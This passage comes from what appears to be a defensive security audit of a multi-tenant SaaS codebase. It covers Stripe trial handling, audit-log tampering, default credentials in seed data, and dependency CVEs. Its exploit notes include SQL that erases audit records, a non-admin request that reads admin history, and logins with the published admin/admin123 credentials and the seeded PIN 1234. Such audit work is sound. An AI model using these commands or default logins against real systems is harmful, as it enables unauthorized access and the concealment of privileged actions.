When a Stripe subscription moves to `status='trialing'` (e.g. after an operator applies a free trial extension in the Stripe Dashboard, or after a subscription_schedule attaches a trial phase), the `customer.subscription.updated` handler's `active`/`canceled`/`unpaid` conditionals are all false. The handler silently falls through — if the tenant was on `plan='free'`, they remain free; if they were on `plan='pro'`, they retain Pro. There is no case to promote a `trialing` subscription to Pro (which is the correct behavior — a Stripe-managed trial should grant Pro), and more critically, there is no guard preventing a tenant on the free DB plan from gaining Pro access if their subscription flips to `trialing` through operator error.

**Code:**
```typescript
if (sub.status === 'active') {
  // set plan='pro'
} else if (sub.status === 'canceled' || sub.status === 'unpaid') {
  // set plan='free'
}
// sub.status === 'trialing' → silent no-op
```

**Exploit:**
Indirect: an operator who applies a Stripe trial extension (standard Stripe Dashboard operation) will NOT see the tenant get promoted to Pro — creating a confusing state where the customer paid, then was put on a trial, and the CRM shows them as free. More critically, if there is any path by which `trialing` status is reachable without going through the app's own checkout flow, the mismatch can cause a Pro subscription to appear as free or vice-versa.

**Fix:**
Add `sub.status === 'trialing'` as an alias for `active` in the `customer.subscription.updated` handler: set `plan='pro'` for a trialing subscription (Stripe sends this when a trial is active and the subscription will auto-convert to paid). The app's own trial mechanism in `tenantResolver.ts` (which reads `tenants.trial_ends_at`) should continue to run in parallel as the primary in-app trial gate.

---

### LOW — Trial expiry comparison in voice webhook uses local-timezone parsing (`new Date(string)`)

**Where:** `packages/server/src/routes/voice.routes.ts:586`

**What:**
The voice recording download webhook checks `new Date(tenantRow.trial_ends_at).getTime() > Date.now()` to determine if the trial is active for the storage limit check. The field `trial_ends_at` is stored by SQLite as `datetime('now', '+14 days')` — a bare `YYYY-MM-DD HH:MM:SS` string with no timezone suffix. `new Date('2026-01-01 12:00:00')` is parsed as LOCAL time on V8, not UTC, producing a time shift of up to ±12 hours. This is the exact bug that `tenantResolver.ts`'s `parseSqliteUtc()` helper was written to fix, but the voice webhook duplicates the logic without using that helper.

**Code:**
```typescript
// voice.routes.ts:586 — local-timezone bug:
const trialActive = !!tenantRow.trial_ends_at &&
  new Date(tenantRow.trial_ends_at).getTime() > Date.now();
// Should use parseSqliteUtc() like tenantResolver.ts does:
// const trialActive = isTrialActive(tenantRow.trial_ends_at, tenantTz);
```

**Exploit:**
On a server running in a timezone west of UTC (e.g. UTC-8), a tenant whose 14-day trial ends at `2026-05-20 00:00:00 UTC` would have their trial_ends_at parsed as `2026-05-20 08:00:00 UTC` — giving them 8 extra free-storage hours. Conversely, on a UTC+8 server, the trial would appear to have ended 8 hours early, incorrectly blocking storage writes during a valid trial. Impact is limited to storage quota enforcement for voice recordings, not plan gating.

**Fix:**
Replace the bare `new Date(tenantRow.trial_ends_at).getTime()` call with the existing `parseSqliteUtc()` helper from `tenantResolver.ts` (move it to a shared utils module) or simply append 'Z' to the string: `new Date(tenantRow.trial_ends_at.replace(' ', 'T') + 'Z').getTime()`.

---

### LOW — Billing rate limiter uses `checkWindowRate` + `recordWindowFailure` (non-atomic) for checkout

**Where:** `packages/server/src/routes/billing.routes.ts:16–28`

**What:**
The `billingRateLimit` middleware checks the rate limit with `checkWindowRate()` and then records the attempt with `recordWindowFailure()` in two separate statements. Per `rateLimiter.ts`'s own deprecation comment on `recordWindowFailure`, this is a known TOCTOU issue (`SCAN-1065`): two concurrent upgrade clicks could both pass `checkWindowRate` before either writes, resulting in both proceeding past the rate limit. The correct atomic alternative `consumeWindowRate()` was added specifically to address this.

**Code:**
```typescript
function billingRateLimit(req, res, next) {
  const key = String(req.tenantId);
  if (!checkWindowRate(req.db, 'billing', key, BILLING_RATE_LIMIT_MAX, BILLING_RATE_LIMIT_WINDOW)) {
    return res.status(429).json(...);
  }
  recordWindowFailure(req.db, 'billing', key, BILLING_RATE_LIMIT_WINDOW); // non-atomic with check above
  next();
}
```

**Exploit:**
Two concurrent requests to `POST /api/v1/billing/checkout` from the same tenant at rate-limit saturation can both pass the check before either increments the counter. At 10 req/10-min limit this doesn't offer meaningful bypass since `createCheckoutSession` has its own per-tenant lock (`stripe_customer_lock`), but the rate limit as written can be slightly exceeded under concurrency.

**Fix:**
Replace the `checkWindowRate` + `recordWindowFailure` pair with a single `consumeWindowRate()` call, which performs the check and increment atomically in one transaction.

---

### INFO — `customer.subscription.deleted` does not clear `payment_past_due` flag on downgrade

**Where:** `packages/server/src/services/stripe.ts:849–881`

**What:**
When `customer.subscription.deleted` fires, the handler sets `plan='free'` and `stripe_subscription_id=NULL` but does NOT reset `payment_past_due` to 0. A tenant who was past-due and then had their subscription deleted retains `payment_past_due=1` indefinitely. This is cosmetically wrong (the "past due" badge would persist in any admin UI reading this field) but also affects `processPaymentFailed`'s differential UPDATE logic, which skips updating `failed_charge_count` when `payment_past_due` is already 1 — meaning future subscription events for a re-subscribing tenant would see a pre-set past-due flag from their old subscription.

**Code:**
```typescript
case 'customer.subscription.deleted': {
  masterDb.prepare(
    `UPDATE tenants SET plan = 'free', stripe_subscription_id = NULL, updated_at = datetime('now')
     WHERE id = ?`
  ).run(tenantWithSub.id);
  // ↑ payment_past_due and failed_charge_count NOT cleared
}
```

**Exploit:**
No direct financial exploit, but a re-subscribing tenant who previously had payment failures will have stale `payment_past_due=1` on their row. If an admin dashboard surfaces this, they may waste support time on a false positive. More significantly, the differential UPDATE in `processPaymentFailed` silently skips incrementing `failed_charge_count` for this tenant, meaning the auto-downgrade after 3 failures would not trigger correctly for their new subscription.

**Fix:**
Add `failed_charge_count = 0, payment_past_due = 0` to the `customer.subscription.deleted` UPDATE statement, matching the cleanup already done in `checkout.session.completed` (line 818) and `updateSubscription` (line 1178).

---

### INFO — No JWT tier claim means no downgrade lag; confirmed safe

**Where:** `packages/server/src/middleware/auth.ts`, `packages/server/src/middleware/tenantResolver.ts`

**What:**
Checked that no plan/tier claim is embedded in the JWT. JWT carries only `userId`, `sessionId`, `role`, `type`, and `tenantSlug`. The tenant plan is resolved on every request by `tenantResolver.ts` querying the master DB (with a 60-second in-process cache invalidated on plan changes). This means there is **no downgrade lag** from token TTL — once `clearPlanCache()` is called (done on all Stripe webhook plan updates), the next request to any tenant endpoint re-reads the plan from the master DB.

**Fix:**
No action required. The current approach is correct. Consider documenting the 60-second `PLAN_CACHE_TTL_MS` window as the maximum enforcement lag in operational runbooks.

---

### INFO — Multi-location CRUD has no `multiLocations` feature gate

**Where:** `packages/server/src/index.ts:1705`

**What:**
The `/api/v1/locations` route is mounted with only `authMiddleware` — no `requireFeature()`. Multi-location management is a feature that logically belongs to Pro (it is not listed in `PlanFeatures` in `plans.ts`), but `PlanFeatures` has no `multiLocations` key at all. Therefore no enforcement is currently possible via `requireFeature`. Any authenticated tenant admin can create additional locations regardless of plan.

**Fix:**
If multi-location is intended as a Pro feature, add `multiLocations: boolean` to `PlanFeatures` in `shared/src/constants/plans.ts` with `false` for free and `true` for pro, then add `requireFeature('multiLocations')` to the mount in `index.ts`. If multi-location is free, no action needed but the plan definitions should explicitly document the decision.

---


---

# T23-audit-tamper

# T23 — Audit-Log Tampering / Append-Only Enforcement / Log Injection / Timestamp Forgery

Scope: `utils/audit.ts`, `utils/masterAudit.ts`, `db/migrations/022_audit_logs.sql`,
`db/master-connection.ts`, `routes/settings.routes.ts`, `routes/settingsExport.routes.ts`,
`routes/tickets.routes.ts`, `routes/invoices.routes.ts`, `services/ticketStatus.ts`,
`routes/smsAutoResponders.routes.ts`, `middleware/auth.ts`.

---

### MEDIUM — No DB-level protection prevents UPDATE/DELETE on audit_logs

**Where:** `packages/server/src/db/migrations/022_audit_logs.sql:1`
`packages/server/src/routes/customers.routes.ts:2219`

**What:**
The `audit_logs` table is created with no `BEFORE UPDATE`, `BEFORE DELETE`, or `AFTER UPDATE` triggers
that would abort mutation attempts. Append-only enforcement exists solely by code convention — no route
intentionally issues `UPDATE audit_logs` except the GDPR-erase path (which is legitimate and scoped) and
the background retention sweep. Any tenant `admin` with raw SQL access (e.g. via a future SQL console
route, a misconfigured admin tool, or a SQL-injection bug elsewhere in the codebase) can silently alter
or erase audit rows after the fact.

**Code:**
```sql
-- migrations/022_audit_logs.sql — no triggers, no write-block
CREATE TABLE IF NOT EXISTS audit_logs (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    event      TEXT NOT NULL,
    user_id    INTEGER,
    ip_address TEXT,
    details    TEXT,
    created_at TEXT NOT NULL DEFAULT (datetime('now'))
);
```

**Exploit:**
A malicious admin or a future SQL-execution endpoint issues `DELETE FROM audit_logs WHERE user_id = X`
or `UPDATE audit_logs SET details = '{}' WHERE event = 'role_changed'`; the operation succeeds silently
and the forensic record is gone. The `master_audit_log` has the same gap — no triggers protect it either.

**Fix:**
Add SQLite `BEFORE UPDATE` and `BEFORE DELETE` triggers on `audit_logs` (and `master_audit_log`) that
unconditionally `SELECT RAISE(ABORT, 'audit_log is immutable')`. The legitimate GDPR scrub path already
uses `JSON_REMOVE` on `details` only — exempt that operation via a special sentinel event if needed, or
accept the restriction and limit GDPR scrubbing to a separate privacy table.

---

### MEDIUM — GET /settings-ext/history audit log viewer missing adminOnly guard

**Where:** `packages/server/src/routes/settingsExport.routes.ts:401`

**What:**
The `GET /settings-ext/history` endpoint returns the most recent settings-change audit events from
`audit_logs` filtered to `settings_%` events and user creation/deletion. The route file's comment states
"All endpoints require admin role," but the actual `router.get('/history', asyncHandler(...))` definition
at line 401 does **not** include the `adminOnly` middleware. The parent mount at `index.ts:1641` only
applies `authMiddleware` (valid JWT, any role). A cashier, technician, or any other non-admin user can
call this endpoint and read the settings-change history, exposing admin usernames, setting keys modified,
and timestamps.

**Code:**
```typescript
// settingsExport.routes.ts — compare lines 213 (has adminOnly) vs 401 (missing it)
router.get(
  '/export.json',
  adminOnly,           // ← present
  asyncHandler(async (req, res) => { ... })
);

router.get(
  '/history',          // ← adminOnly is NOT here
  asyncHandler(async (req, res) => {
    // returns audit_logs rows filtered to settings events + user CRUD
  })
);
```

**Exploit:**
An authenticated cashier sends `GET /api/v1/settings-ext/history` with their valid JWT and receives a
paginated list of audit events that includes `user_created`, `user_role_changed`, `password_changed_by_admin`,
and all `setting_changed` rows — information that should be restricted to admins.

**Fix:**
Add `adminOnly` as the second argument to the `router.get('/history', ...)` call, matching the pattern
used by `/export.json`, `/import`, and `/bulk` on the same router.

---

### MEDIUM — smsAutoResponders /history queries non-existent table `audit_log` (silently returns empty)

**Where:** `packages/server/src/routes/smsAutoResponders.routes.ts:191`

**What:**
The `GET /sms-auto-responders/:id` detail endpoint attempts to read the last 20 match timestamps from
the audit log using table name `audit_log` (without trailing `s`) and column name `action` — neither
of which exist in this schema. The correct table is `audit_logs` and the column is `event`. The query
is wrapped in `.catch(() => [])` so the SQL error is swallowed silently and `recent_matches` always
returns an empty array, making the responder match history invisible to operators.

**Code:**
```typescript
// smsAutoResponders.routes.ts:190-198
const recentMatches = await adb.all<{ created_at: string; details: string }>(
  `SELECT created_at, details
     FROM audit_log          -- wrong: table is 'audit_logs'
    WHERE action = 'sms_auto_responder_matched'  -- wrong: column is 'event'
      AND JSON_EXTRACT(details, '$.responder_id') = ?
    ORDER BY created_at DESC
    LIMIT 20`,
  id,
).catch(() => [] as { created_at: string; details: string }[]);
```

**Exploit:**
An operator investigating why an auto-responder fired (or did not fire) can never see match history
because the query silently fails. More broadly, the `.catch(() => [])` suppresses the SQL error from
ever surfacing, masking the bug in production logs.

**Fix:**
Change `FROM audit_log` to `FROM audit_logs` and `WHERE action =` to `WHERE event =`. Remove or narrow
the `.catch()` so the error is at least logged at `warn` level.

---

### MEDIUM — settingsExport history queries non-existent column `al.meta` (returns null, breaks tab filter)

**Where:** `packages/server/src/routes/settingsExport.routes.ts:416`

**What:**
The `/settings-ext/history` endpoint selects `al.meta` from `audit_logs`, but the `audit_logs` schema
(migration 022, unmodified in any later migration) has no `meta` column — the actual column is `details`.
SQLite returns `NULL` for unknown columns in a `SELECT` without raising an error. Because `meta` is
always `NULL`, the `tab` query-string filter at lines 426–439 never matches any row (the guard
`if (!r.meta) return true` always takes the `true` branch and keeps all rows regardless of `tab`),
making the `?tab=<name>` filter silently inoperative.

**Code:**
```typescript
// settingsExport.routes.ts:416-422
`SELECT al.id, al.event, al.user_id, al.meta, al.created_at
   FROM audit_logs al
   WHERE al.event LIKE 'settings_%'
      OR al.event IN ('store_updated','user_created','user_updated','user_deleted')
   ORDER BY al.created_at DESC
   LIMIT ?`
```

**Exploit:**
Functional bug: the `?tab=` filter is disabled, so all matching events are returned to every tab.
In combination with the missing `adminOnly` guard (finding above), an authenticated non-admin receives
unfiltered settings/user-management audit events.

**Fix:**
Change `al.meta` to `al.details` in the `SELECT` list and in the JavaScript `r.meta` references
(lines 428, 430) to `r.details`.

---

### LOW — Ticket creation, deletion, and status changes not written to audit_logs

**Where:** `packages/server/src/routes/tickets.routes.ts:2148`,
`packages/server/src/services/ticketStatus.ts:453`

**What:**
Ticket deletion (a destructive, inventory-restoring operation) calls `insertHistoryAsync(adb, ticketId, ...)` 
which writes to `ticket_history` (a per-ticket log that is soft-deleted with the ticket), but never calls 
`audit()` to write to `audit_logs`. Similarly, `applyTicketStatusChange` in `ticketStatus.ts` writes to 
`ticket_history` only. Ticket creation also does not appear in `audit_logs`. These are among the most
operationally significant events in the application. Only `ticket_merged` and `ticket_duplicated` reach
`audit_logs`.

**Code:**
```typescript
// tickets.routes.ts — DELETE handler ends here, no audit() call
  await insertHistoryAsync(adb, ticketId, userId, 'deleted', 'Ticket deleted');
  broadcast(WS_EVENTS.TICKET_DELETED, { id: ticketId }, req.tenantSlug || null);
  res.json({ success: true, data: { id: ticketId } });

// ticketStatus.ts:453-458 — status change writes ticket_history, not audit_logs
  await insertHistory(
    adb, ticketId, userId, 'status_changed',
    `Status changed from "${oldStatus?.name ?? '?'}" to "${newStatus.name}"`,
    oldStatus?.name ?? null, newStatus.name,
  );
```

**Exploit:**
A rogue admin deletes a ticket (soft-delete with stock restoration) or changes a ticket status; neither
event appears in the tamper-visible `audit_logs` table that admins search during investigations. The
`ticket_history` table is scoped per ticket and not visible in the global audit log viewer, making the
deletion invisible to compliance searches.

**Fix:**
Add `audit(db, 'ticket_deleted', userId, ip, { ticket_id: ticketId, order_id: ... })` after the
`claimedDelete` success check. Add `audit(db, 'ticket_status_changed', userId, ip, { ticket_id, from, to })`
in `applyTicketStatusChange`. Mirror the same for ticket creation.

---

### LOW — Invoice payment recording not written to audit_logs

**Where:** `packages/server/src/routes/invoices.routes.ts:780`,
`packages/server/src/routes/invoices.routes.ts:131` (`postPaymentSideEffects`)

**What:**
`POST /invoices/:id/payments` inserts into `payments`, updates `invoices`, and calls
`postPaymentSideEffects`. The side-effects helper writes to `activity_events` (via `logActivity`) and
fires a webhook, but never calls `audit()` to write to `audit_logs`. Invoice void does call
`audit(db, 'invoice_voided', ...)` at line 952, creating an asymmetry where voiding is in the audit
trail but the original payment record is not.

**Code:**
```typescript
// invoices.routes.ts — payment route ends without audit() call
  await postPaymentSideEffects({ adb, db, invoice, paymentId, paymentAmount, paymentMethod, userId });
  // ... overpayment handling ...
  res.status(201).json({ success: true, data: updated });
```

**Exploit:**
A manager can record a payment, cancel the investigation trail query (which searches `audit_logs`), and
the payment appears nowhere in the audit log. If `activity_events` is purged or the retention sweep
removes old rows, no forensic record of the payment remains in `audit_logs`.

**Fix:**
Add `audit(db, 'payment_recorded', userId, ip, { invoice_id, payment_id: paymentId, amount, method })`
at the end of `POST /invoices/:id/payments`, after `postPaymentSideEffects` returns successfully.

---

### LOW — Failed privileged operations never written to audit_logs (reconnaissance invisible)

**Where:** `packages/server/src/middleware/auth.ts:261`

**What:**
`requirePermission()` returns a 403 when an authenticated user lacks the required permission. The
rejection is not logged to `audit_logs` — there is no call to `audit()` on the 403 path. This means
a rogue insider probing for access (e.g. a cashier repeatedly trying to call `invoices.void` or
`customers.gdpr_erase` endpoints) leaves no trace in the audit log. Only login failures are tracked
(via `logTenantAuthEvent`); mid-session privilege probing is completely invisible.

**Code:**
```typescript
// auth.ts:261 — permission denied, no audit call
  res.status(403).json(errorBody(ERROR_CODES.ERR_PERM_INSUFFICIENT, 'Insufficient permissions', rid, { permission }));
  // no: audit(req.db, 'permission_denied', req.user.id, req.ip, { permission, path: req.path })
```

**Exploit:**
An insider with a low-privilege account systematically probes API endpoints for over-permissive holes;
no trace appears in audit_logs, making the reconnaissance phase invisible to the operator reviewing
the security log.

**Fix:**
In the 403 branch of `requirePermission`, call `audit(req.db, 'permission_denied', req.user!.id, req.ip || 'unknown', { permission, method: req.method, path: req.path })` — best-effort (wrapped in try/catch mirroring the existing audit helper pattern).

---

### INFO — Audit write and state mutation are not atomic (TOCTOU: crash between mutation and audit)

**Where:** `packages/server/src/utils/audit.ts:42`,
all callers in routes (e.g. `routes/invoices.routes.ts:952`, `routes/settings.routes.ts:526`)

**What:**
Every route calls `audit()` as a separate synchronous `INSERT` after the state-mutating `await adb.run(...)` 
completes. Both the mutation and the audit are in the same SQLite single-tenant connection, but they are
not wrapped in a `db.transaction(...)` block together. If the Node.js process is killed or crashes between
the mutation commit and the audit INSERT, the state change is permanent but the audit record is never
written — a "silent change" without a trace. For sync routes (`db.prepare().run()`) the two operations
happen synchronously in sequence but still outside a transaction.

**Code:**
```typescript
// example: invoices.routes.ts
await adb.run("UPDATE invoices SET status='void' ..."); // state committed
// << server crash here = no audit record >>
audit(db, 'invoice_voided', req.user!.id, req.ip || 'unknown', { invoice_id: ... });
```

**Exploit:**
A server OOM-kill or SIGKILL between mutation and audit is a low-probability but non-zero event. In
normal usage the gap is microseconds, but on a heavily loaded server it may be more. An attacker who
can induce a server crash at the right moment (e.g. by triggering memory exhaustion) could cause a
sensitive state change (role escalation, refund, void) to go unlogged.

**Fix:**
Wrap critical state mutations + audit calls in a `db.transaction(() => { ... })` block using the
better-sqlite3 synchronous transaction API. For async routes, serialize the audit INSERT into the same
async DB call chain using `adb.run` for the audit row before returning, and consider a helper that
accepts both the mutation SQL and the audit event so callers cannot accidentally split them.

---

### INFO — master_audit_log also has no DB-level append-only protection

**Where:** `packages/server/src/db/master-connection.ts:126`

**What:**
The `master_audit_log` table in the master database has the same schema as `audit_logs` — no triggers,
no constraints preventing UPDATE/DELETE. Any code path that obtains the `masterDb` handle can
`masterDb.prepare('DELETE FROM master_audit_log WHERE ...').run(...)` without obstruction. The automated
retention sweep in `index.ts:2798` correctly deletes rows older than 730 days, but there is no guard
preventing an earlier ad-hoc deletion.

**Code:**
```typescript
// master-connection.ts:126-135
CREATE TABLE IF NOT EXISTS master_audit_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  super_admin_id INTEGER REFERENCES super_admins(id),
  action TEXT NOT NULL,
  ...
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
  -- no BEFORE DELETE/UPDATE trigger
);
```

**Exploit:**
A compromised super-admin account (or a bug in the management route layer) can delete recent
`master_audit_log` entries to cover privileged actions (tenant deletion, impersonation, JWT secret
rotation) without leaving a trace.

**Fix:**
Same as for `audit_logs`: add `BEFORE UPDATE` and `BEFORE DELETE` triggers on `master_audit_log`
in the master DB initialization that call `RAISE(ABORT, 'master_audit_log is immutable')`.
Legitimate retention deletes (the 730-day sweep) are already scoped by `created_at < datetime('now', '-730 days')`
and could be exempted via a dedicated SQLITE PRAGMA or by accepting one narrow delete path.

---


---

# T24-fixtures

# T24 — Test Fixtures / Sample Data / Seed Data

## Scope
- `packages/server/src/services/sampleData.ts`
- `packages/server/src/db/seed.ts`
- `packages/server/src/db/device-models-seed.ts` + `device-models-seed-runner.ts`
- `packages/server/src/scripts/full-import.ts`, `reimport-notes.ts`, `reset-database.ts`
- `packages/server/src/__tests__/repairPricing.dpi.test.ts`
- `packages/server/src/__tests__/setupWizard.gate.test.ts`
- `packages/server/src/db/migrations/011_repair_conditions_categories.sql` (and all migrations)
- `.env.example`
- `README.md`, `scripts/README.md`

---

### HIGH — Default `admin/admin123` credentials publicly documented and used as script fallback

**Where:** `packages/server/src/scripts/full-import.ts:33`, `README.md:56-57`, `scripts/README.md:48`, `.env.example:183`

**What:**
`full-import.ts` falls back to `username: 'admin', password: 'admin123'` when `ADMIN_USERNAME`/`ADMIN_PASSWORD` env vars are absent. The README and `scripts/README.md` both openly publish these credentials as the stated defaults. A developer who clones the repo, runs the setup wizard, picks `admin` as username, and uses `admin123` as the setup password (guided by the README) has a live instance with documented credentials. The `index.ts:603` startup check only blocks this in `NODE_ENV=production` — in development it only warns. The `full-import.ts` script is designed to run against a live server ("Server must be running"), so if that server is accessible (e.g. exposed via ngrok during testing), any attacker who reads the README can authenticate.

**Code:**
```typescript
// full-import.ts:29-36
async function login(): Promise<string> {
  const resp = await fetch(`${SERVER_URL}/api/v1/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      username: process.env.ADMIN_USERNAME || 'admin',
      password: process.env.ADMIN_PASSWORD || 'admin123'
    }),
  });
```

**Exploit:**
Attacker reads README (public repo), sees `admin`/`admin123` defaults, hits `/api/v1/auth/login` on any dev/staging server running with default credentials, obtains a JWT, and has full admin access. The `index.ts` production block doesn't protect dev/staging.

**Fix:**
Remove the hardcoded fallbacks from `full-import.ts` — require `ADMIN_USERNAME` and `ADMIN_PASSWORD` env vars explicitly and fail with a clear message if absent. Redact `admin123` from README and `scripts/README.md`; replace with instructions to run `POST /setup` and choose a strong password. Add an INSECURE_SECRETS check in the startup path that also applies in `NODE_ENV=development` (just with `warn` severity).

---

### MEDIUM — Default PIN `1234` seeded for every new user; PIN_NOT_SET gate only covers switch-user, not all PIN paths

**Where:** `packages/server/src/services/tenant-provisioning.ts:347`, `packages/server/src/routes/auth.routes.ts:643`, `packages/server/src/db/migrations/101_pin_set_flag.sql`

**What:**
Every new admin user is seeded with `bcrypt('1234')` as their PIN and `pin_set=0` (the DB default). The PROD12 gate (`auth.routes.ts:1471`) refuses `POST /auth/switch-user` when `pin_set === 0`, which forces the user to set a real PIN before using the switch-user flow. However, no equivalent gate exists on `POST /auth/change-pin` (setting the PIN the first time) or anywhere a staff member could use the default PIN `1234` before they've changed it. Additionally, the setup wizard path in `auth.routes.ts:643` also seeds `1234` for the initial admin's PIN with `pin_set` defaulting to 0 — so the initial admin's PIN is known until they explicitly change it.

**Code:**
```typescript
// tenant-provisioning.ts:347-358
const defaultPin = await bcrypt.hash('1234', 12);
tenantDb.prepare(`
  INSERT INTO users (username, email, password_hash, password_set, first_name, last_name, role, pin, is_active)
  VALUES (?, ?, ?, 1, ?, ?, 'admin', ?, 1)
`).run(
  opts.adminEmail.split('@')[0],
  opts.adminEmail,
  passwordHash,
  opts.adminFirstName || 'Admin',
  opts.adminLastName || '',
  defaultPin,  // always '1234'
);
```

**Exploit:**
An attacker with a credential for one user account can attempt `POST /auth/switch-user` on a newly-provisioned tenant before the admin has changed their PIN, or on any staff account whose PIN was never changed. The switch-user flow gives access to any active user account, bypassing that user's individual password.

**Fix:**
The existing PROD12 gate on switch-user is correct. Extend the same `pin_set === 0` check to the POS quick-PIN login path and any other PIN-accepting endpoint. Consider surfacing a forced PIN-change prompt in the setup wizard UI alongside the password-change step. Do not seed with `1234` — instead, seed with `null` and require the user to set a PIN on first use.

---

### MEDIUM — `.env.example` has uncommented live-format Stripe key placeholders

**Where:** `.env.example:91-93`

**What:**
The `.env.example` contains three uncommented assignments for Stripe credentials:
```
STRIPE_SECRET_KEY=sk_test_...
STRIPE_WEBHOOK_SECRET=whsec_...
STRIPE_PRO_PRICE_ID=price_...
```
These are not commented out like the other optional vars. A developer copy-pasting `.env.example` to `.env` (common practice) will have these three lines active with placeholder values. When `config.ts` reads these, `STRIPE_SECRET_KEY` becomes `sk_test_...` — not empty — so `config.stripeEnabled` is set to `true` (it checks `STRIPE_SECRET_KEY && STRIPE_WEBHOOK_SECRET && STRIPE_PRO_PRICE_ID`, all of which are truthy). This causes the Stripe billing subsystem to load and potentially attempt real API calls using the malformed placeholder value as a secret key.

**Code:**
```bash
# .env.example:91-93
STRIPE_SECRET_KEY=sk_test_...
STRIPE_WEBHOOK_SECRET=whsec_...
STRIPE_PRO_PRICE_ID=price_...
```

**Exploit:**
Low-severity on its own — the placeholder key will be rejected by Stripe APIs. But it creates a false config state: the server believes Stripe is enabled and routes billing traffic accordingly. If an operator replaces only one of the three values with a real key (e.g. their real `sk_test_` key) and leaves the others as placeholder, the webhook verification will fail silently using `whsec_...` as the secret, meaning legitimate Stripe webhook events will be rejected and the platform won't record subscription payments.

**Fix:**
Comment out all three Stripe env vars in `.env.example` so they follow the same pattern as the other optional vars. Add a startup warning (not fatal) when `STRIPE_SECRET_KEY` looks like a placeholder value (`sk_test_...` or `sk_live_...` verbatim without additional chars).

---

### LOW — `full-import.ts` script fallback `SERVER_URL=http://localhost:443` defaults to cleartext HTTP

**Where:** `packages/server/src/scripts/full-import.ts:27`

**What:**
The `SERVER_URL` default is `'http://localhost:443'` — HTTP not HTTPS. The server always starts with TLS certs and refuses HTTP. If a developer runs this script without setting `SERVER_URL`, the login request goes to `http://localhost:443` which will fail (the server serves HTTPS on 443). However, the error message will be opaque. More critically, the pattern teaches bad habits: future forks or CI jobs may set `SERVER_URL` to an http:// staging URL, sending the admin credential in cleartext.

**Code:**
```typescript
// full-import.ts:27
const SERVER_URL = process.env.SERVER_URL || 'http://localhost:443';
```

**Exploit:**
Low exploitation risk since the server rejects HTTP. Risk is latent: an operator who sets up an HTTP-accessible staging instance for import work sends `admin`/`admin123` (or their real admin password) in cleartext over the network. Combined with the default credential exposure (HIGH above), this creates a compound attack surface.

**Fix:**
Change default to `'https://localhost:443'`. Add a startup check: if `SERVER_URL.startsWith('http://')` and `NODE_ENV` is not `development`, log a warning.

---

### INFO — Sample data uses `example.com` emails and 555-01xx phones (safe, no GDPR/SMS risk)

**Where:** `packages/server/src/services/sampleData.ts:83-89`

**What:**
Sample customers use `@example.com` addresses (RFC 2606 reserved, non-deliverable) and `3035550101-3035550105` phone numbers (555-01xx block, per the comment at line 80, reserved for fictional use in telephony). `email_opt_in=0` and `sms_opt_in=0` are set at INSERT time (line 176). The SMS notification path (notifications.ts:403-405) correctly evaluates `sms_opt_in === 0` as opted-out. The dunning scheduler (dunningScheduler.ts:685-686) also respects `sms_opt_in !== 0` as a hard gate. No real PII is embedded. Migrations 162 and 163 (mentioned in audit brief) do not exist in this branch.

**Exploit:**
No exploitable issue. Sample data is correctly sandboxed.

**Fix:**
No change required. Consider adding an explicit `source = 'sample_data'` WHERE-clause filter to the dunning eligibility query as defense-in-depth (it currently relies only on the opt-in flags).

---

### INFO — Test fixtures (repairPricing.dpi.test.ts, setupWizard.gate.test.ts) are clean — no live credentials or real PII

**Where:** `packages/server/src/__tests__/repairPricing.dpi.test.ts`, `packages/server/src/__tests__/setupWizard.gate.test.ts`

**What:**
Both test files use in-memory SQLite (`:memory:`), generic fixture data (`Apple`, `iPhone 13`, `mobilesentrix` as supplier source name), and no API keys, no real email addresses, no phone numbers, no tokens. The `setupWizard.gate.test.ts` file uses `127.0.0.1` as the mock IP. No hardcoded credentials. The ALLOWED_CONFIG_KEYS set in the inline test handler correctly mirrors the real production allowlist.

**Exploit:**
No exploitable issue.

**Fix:**
No change needed.

---

### INFO — `admin123` startup check only runs in single-tenant mode (multi-tenant provisioning uses user-supplied password)

**Where:** `packages/server/src/index.ts:599-617`

**What:**
The `admin123` startup-block (lines 601-614) queries `users WHERE username = 'admin'` — only meaningful in single-tenant mode where the setup wizard creates a user named `admin`. In multi-tenant mode, the admin username is derived from the email prefix (`opts.adminEmail.split('@')[0]`) and can be any string. The multi-tenant provisioning path never seeds `admin123`; it uses the caller-supplied `opts.adminPassword`. This is correct by design but the startup check is invisible to multi-tenant deployments where a careless operator set their own shop's admin password to `admin123` during signup.

**Exploit:**
Low risk — multi-tenant signups require the password at `POST /api/v1/signup` with a 8–128 char validation, and a captcha. But `admin123` passes the 8-char minimum.

**Fix:**
Consider adding a background check at tenant provision time (and on first login) that warns the operator if their password bcrypt-matches `admin123` or other common passwords from a short blocklist. The `zxcvbn` library or a short static blocklist would suffice.

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 0 |
| HIGH | 1 |
| MEDIUM | 2 |
| LOW | 1 |
| INFO | 3 |

**Most impactful finding:** HIGH — default `admin/admin123` credentials are publicly documented in the README and used as the fallback in `full-import.ts`, enabling trivial authentication against any dev/staging server that followed the README setup guide. The startup block in `index.ts` only hard-fails this in `NODE_ENV=production`, leaving dev and staging instances exposed.

Migrations 162 and 163 referenced in the audit brief do not exist in this branch (latest migration is 154). No real customer emails, real phone numbers, SMTP credentials, or live API keys were found in any seed file, migration, or test fixture.


---

# T25-deps

# T25 — Dependency CVEs / Outdated Libs / Supply-Chain Risk

**Auditor:** T25 slot  
**Scope:** `package.json`, `packages/server/package.json`, `packages/web/package.json`, `packages/shared/package.json`, `packages/management/package.json`, and `package-lock.json` (all 1 023 resolved packages)  
**Method:** Full lockfile parse; version × CVE cross-reference; source diff of high-risk packages; deprecated-package enumeration; install-script enumeration; integrity-hash spot-checks; bcrypt usage audit across all `.ts` production files.

---

## Cleared / Not Vulnerable

The following packages were audited against known CVEs and are at patched versions:

| Package | Installed | CVEs checked | Status |
|---------|-----------|--------------|--------|
| express | 4.22.1 | CVE-2024-29041 (< 4.19.2), CVE-2024-43796 (< 4.20.0) | ✓ FIXED |
| serve-static | 1.16.3 | CVE-2024-43799 (< 1.16.0) | ✓ FIXED |
| body-parser | 1.20.4 | CVE-2024-45590 (< 1.20.3) | ✓ FIXED |
| cookie | 0.7.2 | CVE-2024-47764 (< 0.7.0) | ✓ FIXED |
| ws | 8.20.0 | CVE-2024-37890 (< 8.17.1) | ✓ FIXED |
